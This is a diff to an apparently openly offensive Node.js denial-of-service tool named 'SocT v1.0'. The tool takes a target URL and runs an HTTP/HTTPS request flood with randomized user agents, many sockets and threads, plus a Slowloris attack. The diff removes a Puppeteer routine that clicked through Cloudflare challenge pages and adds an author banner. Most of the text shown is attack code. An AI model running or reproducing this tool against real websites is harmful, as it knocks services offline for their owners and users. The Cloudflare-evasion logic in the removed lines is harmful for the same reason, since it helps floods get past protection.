@@ -2,17 +2,15 @@ const http = require('http');
 const https = require('https');
 const net = require('net');
 const readline = require('readline');
-const puppeteer = require('puppeteer');
 
 const rl = readline.createInterface({
     input: process.stdin,
     output: process.stdout
 });
 
-console.log("[?] Put (https://) or (http://) first.");
+console.log("[?] put (https://) or (http://) first.");
 console.log("");
-rl.question('.!URL > ', async (url) => {
-    const sleep = (milliseconds) => new Promise(resolve => setTimeout(resolve, milliseconds));
+rl.question('.!URL > ', (url) => {
     const targetUrl = url;
     const socketConnections = 600;
     const threads = 18;
@@ -47,38 +45,12 @@ rl.question('.!URL > ', async (url) => {
         return `Mozilla/5.0 (${randomOS}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomBrowser}/${version}.0`;
     }
 
-    async function bypassCloudflare(page) {
-        const isCloudflare = await page.evaluate(() => {
-            return document.getElementById('cf-wrapper') !== null;
-        });
-
-        if (isCloudflare) {
-            const bypassButton = await page.evaluate(() => {
-                const button = document.querySelector('button[id^="cf-"]');
-                return button ? button.id : null;
-            });
-
-            if (bypassButton) {
-                await page.waitForSelector(`#${bypassButton}`);
-                await page.click(`#${bypassButton}`);
-                await page.waitForNavigation({ waitUntil: 'networkidle2' });
-            } else {
-                console.error('Cloudflare.Bypasser: Button ID not found?');
-                await sleep(2500);
-            }
-        }
-    }
-
-    async function attack(protocol) {
+    function attack(protocol) {
+        console.log("SocT v1.0 By vzexg-2 <sunshinej1x@omail.edu.pl>");
+        console.log("");
         const transport = protocol === 'https' ? https : http;
         const startTime = Date.now();
         const endTime = startTime + (attackDurationSeconds * 1000);
-
-        const browser = await puppeteer.launch({ headless: true });
-        const page = await browser.newPage();
-        await page.setUserAgent(getRandomUserAgent());
-        await page.goto(targetUrl, { waitUntil: 'networkidle2' });
-        await bypassCloudflare(page);
 
         const timerId = setInterval(() => {
             if (Date.now() < endTime) {
@@ -112,13 +84,12 @@ rl.question('.!URL > ', async (url) => {
             } else {
                 clearInterval(timerId);
                 console.log("Attack finished. Time reached limit, You can edit the timer by editing this file.");
-                browser.close();
                 rl.close();
             }
         }, 100);
     }
 
-    async function slowLorisAttack() {
+    function slowLorisAttack() {
         const startTime = Date.now();
         const endTime = startTime + (attackDurationSeconds * 1000);
         const targetHostname = new URL(targetUrl).hostname;
@@ -137,7 +108,7 @@ rl.question('.!URL > ', async (url) => {
                     });
 
                     socket.on('error', (error) => {
-                        console.log("\x1b[31m[!] Slowloris attack failed. Reason:", error.message);
+                        console.log("\x1b[31m[!] Slowloris attack failed. R:", error.message);
                     });
                 }
             } else {
@@ -156,3 +127,4 @@ rl.question('.!URL > ', async (url) => {
 
     runAttacks();
 });
+                    
